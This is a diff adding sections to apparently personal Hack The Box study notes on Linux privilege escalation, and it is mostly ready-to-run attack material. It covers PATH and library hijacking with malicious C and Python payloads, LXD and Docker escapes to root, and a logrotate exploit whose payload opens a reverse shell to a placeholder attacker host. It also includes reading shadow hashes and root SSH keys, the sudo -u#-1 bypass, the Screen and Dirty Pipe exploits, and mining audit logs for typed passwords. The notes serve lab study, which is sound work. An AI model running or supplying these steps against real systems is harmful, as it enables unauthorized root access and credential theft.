@@ -286,4 +286,410 @@ snap --version            # target: snapd < 2.37.1 → dirty_sock (CVE-2019-7304
 ntfs-3g --version         # target: 2015.3.14 → CVE-2017-0358
 ```
 
-#### Tags: #LinuxPrivesc #SUID #Capabilities #CronJob #sudo #KernelExploit #etcpasswd #Module18
+---
+
+## Path Abuse (HTB Supplementary)
+
+If a writable directory (commonly `/tmp`) appears early in `$PATH`, a script that calls an external binary without an absolute path will load your version instead.
+
+```bash
+# Check for writable directories in PATH
+echo $PATH
+# Dangerous: /tmp:/usr/local/bin:/usr/bin:/bin
+
+# Identify which binary the root script calls (read the script first)
+cat /opt/scripts/backup.sh
+
+# Create a fake binary in the writable PATH entry
+cat > /tmp/cp << 'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
+EOF
+chmod +x /tmp/cp
+
+# Wait for root to run the script, then use the SUID bash
+/tmp/rootbash -p
+```
+
+See [[Linux Privilege Escalation (HTB Supplementary)#LPE.4. Path Abuse|LPE.4]].
+
+#### Tags: #PathAbuse #LinuxPrivesc
+
+---
+
+## Restricted Shell Escape (HTB Supplementary)
+
+```bash
+# SSH bypass — skips the login shell and profile that loads restrictions
+ssh user@STMIP -t "bash --noprofile"
+
+# In-session escapes
+vi /dev/null
+:set shell=/bin/bash
+:shell
+
+# Python (if available in the restricted env)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# awk
+awk 'BEGIN {system("/bin/bash")}'
+
+# less pager shell escape
+less /etc/passwd
+!bash
+```
+
+See [[Linux Privilege Escalation (HTB Supplementary)#LPE.5. Escaping Restricted Shells|LPE.5]].
+
+#### Tags: #RestrictedShell #ShellEscape #LinuxPrivesc
+
+---
+
+## Privileged Group Abuse (HTB Supplementary)
+
+```bash
+# Check group memberships
+id
+groups
+cat /etc/group | grep "adm\|sudo\|docker\|lxd\|disk\|shadow"
+
+# adm group: read system logs
+ls /var/log/
+grep -r "password\|cred\|secret" /var/log/apache2/ 2>/dev/null
+
+# disk group: raw device read (read any file)
+df -h               # find disk device (e.g. /dev/sda1 mounted at /)
+debugfs /dev/sda1   # interactive filesystem debugger
+# In debugfs: cat /root/.ssh/id_rsa
+
+# shadow group: read password hashes
+cat /etc/shadow
+# Crack offline with hashcat
+```
+
+See [[Linux Privilege Escalation (HTB Supplementary)#LPE.8. Privileged Groups|LPE.8]].
+
+#### Tags: #PrivilegedGroups #admGroup #LinuxPrivesc
+
+---
+
+## LXD Container Escape (HTB Supplementary)
+
+Requires membership in the `lxd` group.
+
+```bash
+# On attack box: build minimal Alpine image
+git clone https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder && bash build-alpine
+python3 -m http.server 80
+
+# On target:
+wget http://PWNIP/alpine-v3.XX-x86_64-<date>.tar.gz
+
+lxc image import ./alpine*.tar.gz --alias myimage
+lxc init myimage mycontainer -c security.privileged=true
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+
+# Inside container — host filesystem at /mnt/root
+cat /mnt/root/root/flag.txt
+# Or plant SUID bash:
+cp /mnt/root/bin/bash /mnt/root/tmp/rootbash && chmod +s /mnt/root/tmp/rootbash
+# On host: /tmp/rootbash -p
+```
+
+See [[Linux Privilege Escalation (HTB Supplementary)#LPE.12. LXD Privilege Escalation|LPE.12]].
+
+#### Tags: #LXD #ContainerEscape #LinuxPrivesc
+
+---
+
+## Docker Group Escape (HTB Supplementary)
+
+Requires membership in the `docker` group.
+
+```bash
+# Confirm access
+id | grep docker
+docker images   # check available images
+
+# Mount host root into container and chroot
+docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+
+# Inside container (as root, with host filesystem as /)
+whoami          # root
+cat /root/flag.txt
+
+# Or plant SUID bash for host persistence
+cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
+# Exit container, then on host: /tmp/rootbash -p
+```
+
+See [[Linux Privilege Escalation (HTB Supplementary)#LPE.13. Docker Privilege Escalation|LPE.13]].
+
+#### Tags: #Docker #DockerEscape #LinuxPrivesc
+
+---
+
+## Logrotate Exploitation — logrotten (HTB Supplementary)
+
+Race condition in logrotate's `create` mode when a writable log file is being rotated.
+
+```bash
+# On attack box: compile logrotten
+git clone https://github.com/whotwagner/logrotten.git
+cd logrotten && gcc logrotten.c -o logrotten
+
+# Prepare payload (bash_completion.d will be sourced by root's next bash login)
+cat > /tmp/payload << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1
+EOF
+chmod +x /tmp/payload
+
+# Transfer logrotten and payload to target, then run
+./logrotten -p /tmp/payload /var/log/some_writable.log
+
+# Trigger logrotate (write to the log to cause a rotation, or wait for schedule)
+echo "test" >> /var/log/some_writable.log
+```
+
+See [[Linux Privilege Escalation (HTB Supplementary)#LPE.14. Logrotate Privilege Escalation|LPE.14]].
+
+#### Tags: #Logrotate #logrotten #LinuxPrivesc
+
+---
+
+## NFS No Root Squash (HTB Supplementary)
+
+```bash
+# Target: enumerate NFS exports
+cat /etc/exports
+# Look for: /share   *(rw,no_root_squash)
+
+# Attack box: enumerate remotely
+showmount -e STMIP
+
+# Attack box: mount and plant SUID bash
+sudo mount -t nfs STMIP:/share /mnt/nfs
+sudo cp /bin/bash /mnt/nfs/rootbash
+sudo chmod +s /mnt/nfs/rootbash
+
+# Target: use the SUID bash
+ls -la /share/rootbash   # confirm rws
+/share/rootbash -p
+```
+
+See [[Linux Privilege Escalation (HTB Supplementary)#LPE.15. NFS No Root Squash|LPE.15]].
+
+#### Tags: #NFS #NoRootSquash #LinuxPrivesc
+
+---
+
+## LD_PRELOAD Shared Library Injection (HTB Supplementary)
+
+Requires `env_keep+=LD_PRELOAD` in sudoers config.
+
+```bash
+# Confirm: sudo -l shows env_keep+=LD_PRELOAD
+
+# Write the malicious shared library
+cat > /tmp/privesc.c << 'EOF'
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+EOF
+
+gcc -fPIC -shared -o /tmp/privesc.so /tmp/privesc.c -nostartfiles
+
+# Inject when running any sudo-allowed binary
+sudo LD_PRELOAD=/tmp/privesc.so <sudo-allowed-binary>
+```
+
+See [[Linux Privilege Escalation (HTB Supplementary)#LPE.17. Shared Libraries (LD_PRELOAD)|LPE.17]].
+
+#### Tags: #LDPreload #SharedLibrary #LinuxPrivesc
+
+---
+
+## Shared Object Hijacking (HTB Supplementary)
+
+SUID binary loads a `.so` from a writable directory in its RUNPATH.
+
+```bash
+# Find the RUNPATH (custom shared library search path baked into the binary)
+readelf -d /opt/some_binary | grep -i "rpath\|runpath"
+# Example: Library runpath: [/development/lib/]
+
+# Confirm that directory is writable
+ls -la /development/lib/
+
+# Find what the binary imports
+ldd /opt/some_binary
+
+# Compile malicious .so named to match the expected library
+cat > /development/lib/libcustom.c << 'EOF'
+#include <stdlib.h>
+static void inject() __attribute__((constructor));
+void inject() {
+    setuid(0);
+    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
+}
+EOF
+gcc -fPIC -shared -o /development/lib/libcustom.so /development/lib/libcustom.c
+
+# Run the SUID binary — it loads your .so first
+/opt/some_binary
+/tmp/rootbash -p
+```
+
+**Check glibc version:** `ldd --version`
+
+See [[Linux Privilege Escalation (HTB Supplementary)#LPE.18. Shared Object Hijacking|LPE.18]].
+
+#### Tags: #SharedObject #SOHijacking #LinuxPrivesc
+
+---
+
+## Python Library Hijacking (HTB Supplementary)
+
+If a sudo-allowed Python script imports a module whose file is writable.
+
+```bash
+# Find where the module lives
+python3 -c "import psutil; print(psutil.__file__)"
+
+# Check if writable
+ls -la /path/to/psutil/__init__.py
+
+# Append payload to module (runs on every import)
+echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")' \
+  >> /path/to/psutil/__init__.py
+
+# Trigger via sudo
+sudo python3 /opt/script.py
+/tmp/rootbash -p
+```
+
+PYTHONPATH variant (requires `env_keep+=PYTHONPATH` in sudoers):
+
+```bash
+mkdir /tmp/psutil
+echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")' \
+  > /tmp/psutil/__init__.py
+sudo PYTHONPATH=/tmp python3 /opt/script.py
+/tmp/rootbash -p
+```
+
+See [[Linux Privilege Escalation (HTB Supplementary)#LPE.19. Python Library Hijacking|LPE.19]].
+
+#### Tags: #PythonHijack #LibraryHijacking #LinuxPrivesc
+
+---
+
+## Sudo -u#-1 Bypass — CVE-2019-14287 (HTB Supplementary)
+
+Affects sudo < 1.8.28. A sudoers entry with `(ALL, !root)` is meant to block running as root, but UID `-1` maps to UID 0 anyway.
+
+```bash
+# Vulnerable sudoers pattern:
+# (ALL, !root) NOPASSWD: /usr/bin/ncdu
+
+# Bypass
+sudo -u#-1 /usr/bin/ncdu
+# Inside ncdu: press 'b' to open a root shell
+
+# Direct shell (if binary allows)
+sudo -u#-1 /bin/bash
+```
+
+See [[Linux Privilege Escalation (HTB Supplementary)#LPE.20. Sudo User ID -1 Bypass (CVE-2019-14287)|LPE.20]].
+
+#### Tags: #SudoBypass #CVE201914287 #LinuxPrivesc
+
+---
+
+## GNU Screen 4.5.0 LPE (HTB Supplementary)
+
+```bash
+# Verify version
+screen --version   # GNU Screen 4.5.0
+
+# Get exploit
+searchsploit screen 4.5
+searchsploit -m 41154.sh
+
+# Read before running (it creates a SUID root shell)
+cat 41154.sh
+bash 41154.sh
+/tmp/rootsh -p
+```
+
+See [[Linux Privilege Escalation (HTB Supplementary)#LPE.10. Vulnerable Services (GNU Screen)|LPE.10]].
+
+#### Tags: #GNUScreen #VulnerableService #LinuxPrivesc
+
+---
+
+## Dirty Pipe — CVE-2022-0847 (HTB Supplementary)
+
+Affects Linux kernel 5.8 through 5.17. Allows unprivileged users to overwrite arbitrary read-only file contents via pipe splice.
+
+```bash
+# Verify kernel
+uname -r   # 5.8 - 5.17 = vulnerable
+
+# PoC implementations:
+# github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits (SUID binary overwrite variant)
+# github.com/n3rada/CVE-2022-0847 (/etc/passwd overwrite variant)
+
+gcc -o dirtypipe dirtypipe.c
+./dirtypipe
+# Drops root shell or modifies /etc/passwd to add passwordless root user
+```
+
+See [[Linux Privilege Escalation (HTB Supplementary)#LPE.22. Dirty Pipe CVE-2022-0847|LPE.22]].
+
+#### Tags: #DirtyPipe #CVE20220847 #KernelExploit #LinuxPrivesc
+
+---
+
+---
+
+## aureport TTY Credential Hunt
+
+When you have shell access as a user in the `adm` group (or as root), Linux audit logs record all TTY input including passwords typed to `su`. `aureport --tty` decodes the audit records and prints them in readable form.
+
+```bash
+# Requires read access to /var/log/audit/audit.log (adm group or root)
+aureport --tty | less
+
+# Example output showing a typed password:
+# 2. 06/01/22 07:13:14  su  "ILFreightnixadm!",<nl>
+# 4. 06/01/22 07:13:28  sudo  "ILFreightnixadm!"
+
+# Grep for credential-like entries
+aureport --tty | grep -E '"[^"]{6,}"'
+```
+
+Expected: any password typed interactively to `su`, `sudo`, or `ssh` appears in the data column inside double quotes.
+
+**Why it works:** Linux Audit Daemon (`auditd`) logs all TTY keystrokes when configured with `-a always,exit -F arch=b64 -S execve` or similar rules. The `tty` action records interactive input, including password prompts. `aureport` decodes the hex-encoded keystroke records into human-readable form.
+
+**Required permissions:** readable `/var/log/audit/audit.log`, typically requires being in the `adm` group or running as root. The `webdev` user in AEN had implicit audit log access.
+
+See [[Attacking Enterprise Networks (HTB Supplementary)#AEN.4. Initial Access|AEN.4]] for the real-world example.
+
+#### Tags: #aureport #AuditLogs #CredentialHunting #LinuxPrivesc #adm #HTBSupplementary
+
+---
+
+#### Tags: #LinuxPrivesc #SUID #Capabilities #CronJob #sudo #KernelExploit #etcpasswd #Module18 #PathAbuse #RestrictedShell #LXD #Docker #Logrotate #NFS #LDPreload #SharedObject #PythonHijack #DirtyPipe #GNUScreen #SudoBypass #aureport #HTBSupplementary
